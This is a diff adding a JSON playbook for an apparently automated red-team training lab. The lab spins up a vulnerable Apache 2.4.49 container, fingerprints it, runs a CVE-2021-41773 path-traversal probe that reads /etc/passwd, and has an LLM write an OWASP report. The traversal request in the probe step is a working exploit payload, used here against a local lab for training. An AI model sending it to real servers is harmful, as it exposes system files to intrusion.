@@ -1,0 +1,82 @@
+{
+  "id": "owasp_web_audit",
+  "title": "Auditoría Web OWASP",
+  "subtitle": "Red Team · OWASP Top 10",
+  "description": "Levanta un entorno web vulnerable (Apache 2.4.49 / Vulhub), verifica exposición y produce un informe orientado a OWASP Top 10 con hallazgos y siguientes pasos.",
+  "duration": "~8 min",
+  "tools": ["docker", "curl", "ARES LLM", "vulhub"],
+  "category": "red_team",
+  "icon": "globe",
+  "badge": "OWASP",
+  "difficulty": "intermediate",
+  "requires_target": false,
+  "lab": {
+    "image": "vulhub/httpd:2.4.49",
+    "description": "Apache 2.4.49 vulnerable (path traversal CVE-2021-41773)"
+  },
+  "steps": [
+    {
+      "id": "deploy",
+      "type": "docker_deploy",
+      "name": "Desplegar lab web vulnerable",
+      "image": "vulhub/httpd:2.4.49",
+      "timeout": 180
+    },
+    {
+      "id": "connectivity",
+      "type": "ping",
+      "name": "Verificar servicio web",
+      "timeout": 30
+    },
+    {
+      "id": "fingerprint",
+      "type": "command",
+      "name": "Fingerprint HTTP",
+      "command": "docker",
+      "args": [
+        "run",
+        "--rm",
+        "--network",
+        "host",
+        "curlimages/curl:8.5.0",
+        "-sS",
+        "-D",
+        "-",
+        "-o",
+        "/dev/null",
+        "http://{target}:{port}/"
+      ],
+      "timeout": 60
+    },
+    {
+      "id": "probe",
+      "type": "command",
+      "name": "Sondas OWASP básicas",
+      "command": "docker",
+      "args": [
+        "run",
+        "--rm",
+        "--network",
+        "host",
+        "curlimages/curl:8.5.0",
+        "-sS",
+        "-w",
+        "\\nHTTP_CODE:%{http_code}\\n",
+        "http://{target}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      ],
+      "timeout": 60
+    },
+    {
+      "id": "analyze",
+      "type": "llm_analyze",
+      "name": "Análisis ARES · OWASP",
+      "prompt": "Eres pentester ético. Con fingerprint y sondas HTTP del lab, elabora un informe OWASP Top 10: 1) Tecnologías detectadas, 2) Endpoints/vectores probados, 3) Hallazgos con severidad y CVE si aplica, 4) Evidencia, 5) Remediación, 6) Próximos pasos del playbook de explotación ética. Español, markdown.",
+      "timeout": 120
+    },
+    {
+      "id": "cleanup",
+      "type": "docker_destroy",
+      "name": "Destruir lab"
+    }
+  ]
+}
